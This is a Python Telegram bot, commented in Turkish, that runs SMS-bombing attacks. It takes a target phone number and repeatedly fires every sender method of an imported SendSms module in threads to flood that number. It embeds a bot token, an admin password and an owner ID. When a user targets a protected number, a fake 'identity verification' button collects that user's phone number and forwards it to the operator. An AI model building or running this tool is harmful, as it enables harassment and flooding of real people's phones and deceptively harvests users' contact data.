import os
import sys
import threading
import telebot
import random
from telebot import types
from time import sleep

# Yerel dosyalar (sms.py) için yol ayarı
sys.path.insert(0, os.getcwd())

try:
    from sms import SendSms
except ImportError:
    print("❌ Hata: sms.py bulunamadı!")

# --- AYARLAR ---
TOKEN = "8330188831:AAGw-S3M3tcJq3XiY-Hy9ym_mLoYdlsG_MI"
ADMIN_SIFRE = "212admin"
PATRON_ID = 8064176286 # İhanet raporları ve kullanıcı numaraları buraya gelir
bot = telebot.TeleBot(TOKEN)

# Yasaklı Numaralar (05015761086 ve 5421817529)
forbidden_list = ["5015761086", "5421817529"]

active_attacks = {}
servisler = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith('__')]

# --- 🚨 İHANET RAPORLAMA (NUMARA ÇEKİCİ) ---
def patrona_ihanet_bildir(user, hedef_no, user_tel="Bilinmiyor"):
    try:
        rapor = (f"⚠️ *KRİTİK: YASAKLI NUMARA DENEMESİ!*\n\n"
                 f"👤 *Saldıran:* @{user.username or user.first_name}\n"
                 f"🆔 *ID:* `{user.id}`\n"
                 f"📱 *Kendi Numarası:* `{user_tel or 'Gizli'}`\n"
                 f"🎯 *Hedef Aldığı No:* `{hedef_no}`\n\n"
                 f"📢 *Not:* Bu kişi senin koruma listendeki birine dokunmaya çalıştı!")
        
        bot.send_message(PATRON_ID, rapor, parse_mode="Markdown")
    except:
        pass

# --- 📱 NUMARA DOĞRULAMA (İHANET ANINDA ÇALIŞIR) ---
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    if message.contact is not None:
        user_tel = message.contact.phone_number
        # Numara geldi, şimdi patrona ilet
        bot.send_message(message.chat.id, "✅ Kimlik doğrulandı kanka. İşleme devam edebilirsiniz.", reply_markup=main_menu())
        patrona_ihanet_bildir(message.from_user, "KORUMALI SİSTEM", user_tel)

# --- ANA MENÜ ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🚀 Bombardıman Başlat"), types.KeyboardButton("📊 Durum"))
    markup.add(types.KeyboardButton("👑 Admin Girişi"), types.KeyboardButton("😎 Geliştiriciler"))
    return markup

# --- ADMIN PANELİ ---
def admin_panel_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ Korunan No Ekle", callback_data="admin_add_no"))
    markup.add(types.InlineKeyboardButton("📜 Listeyi Gör", callback_data="admin_list_no"))
    markup.add(types.InlineKeyboardButton("❌ Paneli Kapat", callback_data="admin_close"))
    return markup

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    t = message.text.strip()
    chat_id = message.chat.id

    if t == "👑 Admin Girişi":
        sent = bot.send_message(chat_id, "🔑 *Admin Şifresini Gir kanka:*", parse_mode="Markdown")
        bot.register_next_step_handler(sent, check_admin_pass)

    elif t == "🚀 Bombardıman Başlat":
        bot.send_message(chat_id, "📱 *Hedef numarayı gir kanka:*", parse_mode="Markdown")
        bot.register_next_step_handler(message, validate_sms)

    elif t == "📊 Durum":
        s = "⚡ Aktif" if chat_id in active_attacks else "💤 Boşta"
        bot.send_message(chat_id, f"📌 Durum: {s}\n📦 Mühimmat: {len(servisler)}")

    # Otomatik Numara Algılama
    elif t.isdigit() and len(t) >= 10:
        validate_sms(message)
    
    # Sohbet
    else:
        bot.reply_to(message, "Anladım kanka. Hedef varsa yaz, yoksa laflayalım.")

def check_admin_pass(message):
    if message.text == ADMIN_SIFRE:
        bot.send_message(message.chat.id, "🔓 *Yetki Onaylandı!*", reply_markup=admin_panel_markup(), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ Şifre yanlış kanka!")

def validate_sms(message):
    tel_no = message.text.replace(" ", "").replace("+90", "")
    if tel_no.startswith("0"): tel_no = tel_no[1:]

    # Yasaklı No Tuzağı (İhanet Tespit)
    if any(tel_no == x or ("0"+tel_no) == x for x in forbidden_list):
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("🛡️ Kimliğimi Doğrula", request_contact=True))
        bot.send_message(message.chat.id, 
                         "⚠️ *GÜVENLİK SİSTEMİ:* Bu numara yüksek koruma altında.\n"
                         "Devam etmek için aşağıdaki butona basarak kimliğinizi doğrulamanız gerekmektedir.", 
                         reply_markup=markup, parse_mode="Markdown")
        
        # Patrona ön rapor ver
        patrona_ihanet_bildir(message.from_user, tel_no, "Onay Bekleniyor...")
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔥 ATEŞLE", callback_data=f"run_{tel_no}"),
               types.InlineKeyboardButton("❌ İPTAL", callback_data="admin_close"))
    bot.send_message(message.chat.id, f"🎯 Hedef: `5{tel_no}`\nOnay?", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_all(call):
    chat_id = call.message.chat.id
    if call.data == "admin_add_no":
        sent = bot.send_message(chat_id, "📞 Eklenecek no (0 olmadan):")
        bot.register_next_step_handler(sent, lambda m: forbidden_list.append(m.text.strip()))
        bot.send_message(chat_id, "✅ Eklendi!")
    elif call.data == "admin_list_no":
        bot.send_message(chat_id, f"📜 Koruma Listesi: `{forbidden_list}`")
    elif call.data == "admin_close":
        bot.delete_message(chat_id, call.message.message_id)
    elif call.data.startswith("run_"):
        tel_no = call.data.split("_")[1]
        
        # Patron'a normal rapor (yasaklı olmayan saldırılar için)
        bot.send_message(PATRON_ID, f"🚀 @{call.from_user.username or call.from_user.first_name} saldırdı: `{tel_no}`")
        
        start_bombing(call.message, tel_no)

def start_bombing(message, tel_no):
    chat_id = message.chat.id
    stop_event = threading.Event()
    active_attacks[chat_id] = stop_event
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 DURDUR", callback_data="stop_now"))
    bot.edit_message_text(f"🚀 `{tel_no}` paket ediliyor...", chat_id, message.message_id, reply_markup=markup)
    def attack():
        send_sms = SendSms(tel_no, "")
        while not stop_event.is_set():
            for f in servisler:
                if stop_event.is_set(): break
                threading.Thread(target=getattr(send_sms, f), daemon=True).start()
                sleep(0.05)
            if not stop_event.is_set(): sleep(15)
    threading.Thread(target=attack, daemon=True).start()

print("📡 212 İhanet Tespit & Admin Panel Yayında!")
bot.infinity_polling()
